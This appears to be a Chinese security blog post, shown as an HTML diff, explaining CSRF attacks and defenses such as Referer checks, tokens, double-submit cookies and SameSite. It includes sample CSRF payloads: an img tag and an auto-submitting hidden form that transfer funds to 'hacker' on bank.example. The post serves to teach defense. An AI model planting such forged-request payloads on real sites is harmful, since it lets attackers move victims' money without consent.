+<p>首先，攻击者会提供一个“不怀好意”的链接，等待用户上钩。当受害者访问了这个有害链接时，其利用页面中的恶意代码强制用户向某个具有CSRF漏洞的服务器发送请求。这个请求因为是从受害者端发出的，因此会自动带上受害者的Cookie。服务器接收到这个请求后，认为是合法用户的请求进而执行，使得攻击者的计谋得逞。这就是CSRF的大致原理。</p>
+<h2 id="3-CSRF-漏洞分类"><a href="#3-CSRF-漏洞分类" class="headerlink" title="3. CSRF 漏洞分类"></a>3. CSRF 漏洞分类</h2><h3 id="3-1-GET-类型"><a href="#3-1-GET-类型" class="headerlink" title="3.1 GET 类型"></a>3.1 GET 类型</h3><p>GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求。</p>
+<p><strong>攻击场景：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://bank.example/withdraw?amount=10000&amp;for=hacker&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure>
+<p>在受害者访问含有这个 img 的页面后，浏览器会自动向 <code>http://bank.example/withdraw?amount=10000&amp;for=hacker</code> 发出一次 HTTP 请求。<code>bank.example</code> 就会收到包含受害者 Cookie 的请求去执行转账操作。</p>
+<ul>
+<li>请求可以嵌入在 <code>&lt;img src&gt;</code>, <code>&lt;script src&gt;</code>, <code>&lt;iframe src&gt;</code> 等标签中，用户访问页面即自动触发。</li>
+</ul>
+<h3 id="3-2-POST-类型"><a href="#3-2-POST-类型" class="headerlink" title="3.2 POST 类型"></a>3.2 POST 类型</h3><p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单。</p>
+<p><strong>攻击场景：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://bank.example/withdraw&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;account&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;xiaoming&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;amount&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10000&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;for&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hacker&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>(); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。</p>
+<ul>
+<li>相比 GET 类型，POST 类型通常需要构造一个表单并执行 JS 自动提交。</li>
+</ul>
+<h3 id="3-3-链接类型"><a href="#3-3-链接类型" class="headerlink" title="3.3 链接类型"></a>3.3 链接类型</h3><p>链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。</p>
+<p><strong>攻击场景：</strong><br>攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://test.com/csrf/transfer.php?amount=1000&amp;for=hacker&quot;</span> <span class="hljs-attr">taget</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span><br>  重磅消息！！<br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>需要用户主动点击，成功率相对较低。</li>
+</ul>
+<h2 id="4-CSRF-防御方案"><a href="#4-CSRF-防御方案" class="headerlink" title="4. CSRF 防御方案"></a>4. CSRF 防御方案</h2><p>CSRF 攻击的两个特点：</p>
+<ol>
+<li>CSRF（通常）发生在第三方域名。</li>
+<li>CSRF 攻击者不能获取到 Cookie 等信息，只是使用。</li>
+</ol>
+<p>针对这两点，我们可以制定防御策略：</p>
+<h3 id="4-1-同源检测-Origin-和-Referer"><a href="#4-1-同源检测-Origin-和-Referer" class="headerlink" title="4.1 同源检测 (Origin 和 Referer)"></a>4.1 同源检测 (Origin 和 Referer)</h3><p>在 HTTP 协议中，每一个异步请求都会携带两个 Header，用于标记来源域名：</p>
+<ul>
+<li><code>Origin Header</code></li>
+<li><code>Referer Header</code></li>
+</ul>
+<p><strong>缺点</strong>：Referer 的值是由浏览器提供的，虽然 HTTP 协议有要求，但是每个浏览器对于 Referer 的具体实现可能有差别，且 Referer 可以被伪造或被用户禁用。</p>
+<ul>
+<li>Origin Header</li>
+</ul>
+<p>在部分与CSRF有关的请求中，请求的Header中会携带Origin字段。字段内包含请求的域名（不包含path及query）。如果Origin存在，那么直接使用Origin中的字段确认来源域名就可以。</p>
+<p>在以下两种情况下<code>Origin</code>并不存在：<br>    1. <strong>IE11同源策略：</strong> IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#IE_Exceptions">MDN Same-origin_policy#IE_Exceptions</a><br>    2. <strong>302重定向：</strong> 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。</p>
+<ul>
+<li>Referer Header</li>
+</ul>
+<p>根据HTTP协议，在HTTP头中有一个字段叫Referer，记录了该HTTP请求的来源地址。对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。</p>
+<p>在以下情况下会导致<code>Referer</code>缺失：浏览器在从 HTTPS 页面向 HTTP 页面发起请求时，<strong>不会发送 Referer 头部</strong>。攻击者可以在 HTTPS 的恶意网站上构造攻击，浏览器此时不带 Referer，如果服务器逻辑是“没有 Header 就放行”，防御就会失效。</p>
+<p>比较成熟的避免方案就是不存在<code>Referer</code>字段的关键请求直接拦截。</p>
+<p><strong>Referrer Policy（引用策略）</strong> 是一个 W3C 规范，用于控制浏览器在发送请求（如链接跳转、加载图片、脚本请求等）时，<code>Referer</code> 头部中应该包含多少信息。</p>
+<p>设置Referrer Policy的三种方法：</p>
+<table>
+<thead>
+<tr>
+<th><strong>作用范围</strong></th>
+<th><strong>设置位置</strong></th>
+<th><strong>代码示例</strong></th>
+<th><strong>适用场景</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>元素级</strong>(最高优先级)</td>
+<td>HTML 标签属性</td>
+<td><code>&lt;a href=&quot;...&quot; referrerpolicy=&quot;no-referrer&quot;&gt;</code></td>
+<td>针对单个链接、图片或脚本进行特殊控制。</td>
+</tr>
+<tr>
+<td><strong>页面级</strong>(中等优先级)</td>
+<td><code>&lt;head&gt;</code> 区域</td>
+<td><code>&lt;meta name=&quot;referrer&quot; content=&quot;strict-origin-when-cross-origin&quot;&gt;</code></td>
+<td>无法修改服务器配置，或仅需控制单页行为。</td>
+</tr>
+<tr>
+<td><strong>全局级</strong>(推荐)</td>
+<td>Web 服务器配置</td>
+<td><code>Referrer-Policy: strict-origin-when-cross-origin</code></td>
+<td><strong>最佳实践</strong>。一次配置，全站生效。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>策略名称</strong></th>
+<th><strong>同源发送内容</strong></th>
+<th><strong>跨域发送内容</strong></th>
+<th><strong>HTTPS$\to$HTTP (降级)</strong></th>
+<th><strong>评价与适用场景</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>no-referrer</strong></td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td><strong>最高隐私</strong>。会破坏 CSRF 防御。</td>
+</tr>
+<tr>
+<td><strong>same-origin</strong></td>
+<td>✅</td>
+<td>❌</td>
+<td>❌</td>
+<td><strong>同源专用</strong>。跨域请求（如从搜索进）会被误判。</td>
+</tr>
+<tr>
+<td><strong>origin</strong></td>
+<td>⚠️</td>
+<td>⚠️</td>
+<td>⚠️</td>
+<td><strong>仅暴露源</strong>。但在不安全降级时也会发送，不推荐。</td>
+</tr>
+<tr>
+<td><strong>strict-origin</strong></td>
+<td>⚠️</td>
+<td>⚠️</td>
+<td>❌</td>
+<td><strong>安全版 Origin</strong>。降级时不发送，比上面那个更好。</td>
+</tr>
+<tr>
+<td><strong>origin-when-cross-origin</strong></td>
+<td>✅</td>
+<td>⚠️</td>
+<td>⚠️</td>
+<td><strong>折中方案</strong>。同源便于分析，跨域保护隐私，但降级不安全。</td>
+</tr>
+<tr>
+<td><strong>strict-origin-when-cross-origin</strong><em>(主流默认)</em></td>
+<td>✅</td>
+<td>⚠️</td>
+<td>❌</td>
+<td><strong>最佳实践</strong>。兼顾同源分析、跨域隐私与传输安全。</td>
+</tr>
+<tr>
+<td><strong>unsafe-url</strong></td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td><strong>极度危险</strong>。无条件泄露所有路径参数，切勿使用。</td>
+</tr>
+<tr>
+<td><strong>no-referrer-when-downgrade</strong><em>(旧默认)</em></td>
+<td>✅</td>
+<td>✅</td>
+<td>❌</td>
+<td><strong>已过时</strong>。跨域也会泄露完整路径，隐私风险大。</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-CSRF-Token"><a href="#4-2-CSRF-Token" class="headerlink" title="4.2 CSRF Token"></a>4.2 CSRF Token</h3><p>CSRF Token 是目前最普遍的防御 CSRF 的方案。</p>
+<p><strong>原理：</strong></p>
+<ol>
+<li>用户打开页面时，服务器生成一个随机的 Token。</li>
+<li>将这个 Token 放入 Session 中，同时将 Token 渲染到页面上（通常在 hidden input 中）。</li>
+<li>用户提交请求时，携带这个 Token。</li>
+<li>服务器验证请求中的 Token 是否与 Session 中的 Token 一致。</li>
+</ol>
+<p><strong>防御实现：</strong><br>前端：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/transfer&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jv93-d93a-32fa-1123&quot;</span> /&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>后端：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> request.form[<span class="hljs-string">&#x27;csrf_token&#x27;</span>] == session[<span class="hljs-string">&#x27;csrf_token&#x27;</span>]:<br>    <span class="hljs-comment"># Token 匹配，执行操作</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># Token 不匹配，拒绝</span><br></code></pre></td></tr></table></figure>
+
+<p>这种防御方案需要确保当前网站中不存在XSS漏洞，如果存在XSS漏洞，攻击者则能够通过XSS漏洞获取得到token，从而进一步实现CSRF漏洞。</p>
+<p>在分布式环境下，由于请求可能会被负载均衡器分发到不同的服务器（节点 A 生成了 Token，但请求被转发到了节点 B），传统的“将 Token 存在本地 Session 内存中”的方案会失效。</p>
+<p>为了解决分布式环境存在的问题，提出了两种不同的解决方式</p>
+<ol>
+<li><strong>集中式 Session 存储</strong><br> 不再把 Session&#x2F;Token 存在 Web 服务器的内存里，而是存到一个独立的、所有服务器都能访问的<strong>高速缓存中间件</strong>中（通常是 Redis 或 Memcached）。</li>
+<li><strong>加密 Token (Encrypted&#x2F;Signed Token) —— 无状态方案</strong><br> 这种方案借鉴了 JWT (JSON Web Token) 的思路。服务器<strong>不再存储</strong> Token，而是将验证逻辑“内嵌”在 Token 本身中。</li>
+</ol>
+<p>目前大多数网站在关键操作上都采用验证码或密码验证的形式，其实本质上也是预防CSRF漏洞攻击的一种方式，本质上其实也算是一种CSRF token。</p>
+<h3 id="4-3-双重-Cookie-验证"><a href="#4-3-双重-Cookie-验证" class="headerlink" title="4.3 双重 Cookie 验证"></a>4.3 双重 Cookie 验证</h3><p><strong>原理：</strong></p>
+<ol>
+<li>在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串（例如 <code>csrfcookie=v8g9e4ksfhw</code>）。</li>
+<li>在前端向后端发起请求时，取出 Cookie，并添加到 URL 参数或 Header 中。</li>
+<li>后端验证 Cookie 中的字段与 URL 参数&#x2F;Header 中的字段是否一致。</li>
+</ol>
+<p><strong>优点</strong>：</p>
+<ol>
+<li>无需使用Session，适用面更广，易于实施。</li>
+<li>Token储存于客户端中，不会给服务器带来压力。</li>
+<li>相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。</li>
+</ol>
+<p><strong>缺点</strong>：</p>
+<ol>
+<li>Cookie中增加了额外的字段。</li>
+<li>如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。</li>
+<li>难以做到子域名的隔离。</li>
+<li>为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。</li>
+</ol>
+<h3 id="4-4-Samesite-Cookie-属性"><a href="#4-4-Samesite-Cookie-属性" class="headerlink" title="4.4 Samesite Cookie 属性"></a>4.4 Samesite Cookie 属性</h3><p>Google 起草了一份草案来改进 HTTP 协议，那就是为 Set-Cookie 响应头新增 Samesite 属性，它用来标明这个 Cookie 是个“同站 Cookie”，同站 Cookie 只能作为第一方 Cookie，不能作为第三方 Cookie。</p>
+<p><strong>配置示例：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>session_id=xyz123; SameSite=Strict;<br></code></pre></td></tr></table></figure>
+
+<p><strong>属性值：</strong></p>
+<ul>
+<li><code>Strict</code>：严格模式，完全禁止第三方 Cookie。</li>
+<li><code>Lax</code>：宽松模式，允许部分第三方请求携带 Cookie (如 GET 请求跳转)。</li>
+<li><code>None</code>：无限制模式，任何请求都会带 Cookie。必须配合 <code>Secure</code> 属性使用。</li>
+</ul>
+<p><code>SameSite=Lax</code> 已经成为所有主流浏览器（Chrome, Edge, Safari, Firefox）的<strong>默认标准</strong>。</p>
+<p>即使部署了 <code>SameSite=Lax</code>，以下情况仍存在风险，需要在设计中补全：</p>
+<ol>
+<li><p><strong>120秒的时间窗口 (Lax + POST)</strong></p>
+<p> 为了兼容某些单点登录 (SSO) 流程，Chrome 曾引入一个特性：如果 Cookie 设置的时间短于 2 分钟，且非幂等请求（POST），可能允许携带。虽然这个策略在不断收紧，但不可完全依赖。</p>
+<p> 关键操作依然建议验证 CSRF Token 或自定义 Header (JWT)。</p>
+</li>
+<li><p><strong>子域劫持 (Subdomain Takeover)</strong></p>
+<p> <code>SameSite</code> 视 <code>a.example.com</code> 和 <code>b.example.com</code> 为一家人。如果攻击者控制了 <code>attacker.example.com</code>，他可以向 <code>bank.example.com</code> 发起 CSRF 攻击，<code>SameSite</code> <strong>不会拦截</strong>。</p>
+<p> Cookie 前缀：使用 <code>__Host-</code> 前缀来强制 Cookie 的作用域仅限于当前主机（不包含子域）。<br> <code>Set-Cookie: __Host-session=xyz; SameSite=Lax; Secure; Path=/</code></p>
+</li>
+<li><p><strong>客户端过期时间差异</strong></p>
+<p> 用户浏览器版本过低（如 IE11 或旧版 Android webview），不支持 <code>SameSite</code>，它会忽略该属性并默认为“发送”。可以通过以下方式实现安全防护</p>
+<ul>
+<li><p>在网关层（Nginx&#x2F;WAF）检测 User-Agent。</p>
+</li>
+<li><p>如果是老旧浏览器，强制要求后端校验 CSRF Token。</p>
+</li>
+<li><p>设置两套 Cookie（一套带 SameSite，一套不带），后端优先读取带 SameSite 的。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="5-总结-1"><a href="#5-总结-1" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>CSRF 与 XSS 区别在于：</p>
+<ul>
+<li>XSS 利用的是用户对指定网站的信任（执行了恶意脚本）。</li>
+<li>CSRF 利用的是网站对用户网页浏览器的信任（凭证自动携带）。</li>
+</ul>
+<p>在现代 Web 开发中，CSRF 的生存空间正在被压缩：</p>
+<ol>
+<li><strong>框架自带防御</strong>：现代 Web 框架（如 Spring Security, Django, Laravel）通常默认开启 CSRF 保护。</li>
+<li><strong>SameSite 普及</strong>：浏览器默认策略逐渐趋向于 <code>SameSite=Lax</code>，大大降低了 CSRF 的成功率。</li>
+<li><strong>前后端分离</strong>：JWT 等认证方式（Header 携带 Token）天然免疫 CSRF（前提是不把 Token 存 Cookie 或 Cookie 设置了 HttpOnly&#x2F;SameSite）。</li>
+</ol>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://tech.meituan.com/2018/09/27/fe-security.html">https://tech.meituan.com/2018/09/27/fe-security.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">https://tech.meituan.com/2018/10/11/fe-security-csrf.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://alf.nu/">https://alf.nu/</a></li>
+<li><a target="_blank" rel="noopener" href="https://geeeez.github.io/posts/xss%E4%B9%8BCSP%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E7%BB%95%E8%BF%87/">https://geeeez.github.io/posts/xss%E4%B9%8BCSP%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E7%BB%95%E8%BF%87/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333173.html">https://www.freebuf.com/articles/web/333173.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions</a></li>
+<li><a target="_blank" rel="noopener" href="https://words.filippo.io/csrf/">https://words.filippo.io/csrf/</a></li>
+<li><a target="_blank" rel="noopener" href="https://ghostsecurity.com/blog/csrf-in-2025-not-dead-just-different">https://ghostsecurity.com/blog/csrf-in-2025-not-dead-just-different</a></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/" class="category-chain-item">攻防渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/" class="print-no-link">#攻防渗透</a>
+      
+        <a href="/tags/XSS/" class="print-no-link">#XSS</a>
+      
+        <a href="/tags/CSRF/" class="print-no-link">#CSRF</a>
+      
+        <a href="/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/" class="print-no-link">#前端安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>深入研究前端漏洞安全（XSS、CSRF）</div>
+      <div>http://candyb0x.github.io/2025/12/24/深入研究前端漏洞安全（XSS、CSRF）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Candy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年12月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/20/%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5-Reflective-DLL-Injection/" title="反射DLL注入 (Reflective DLL Injection)">
+                        <span class="hidden-mobile">反射DLL注入 (Reflective DLL Injection)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
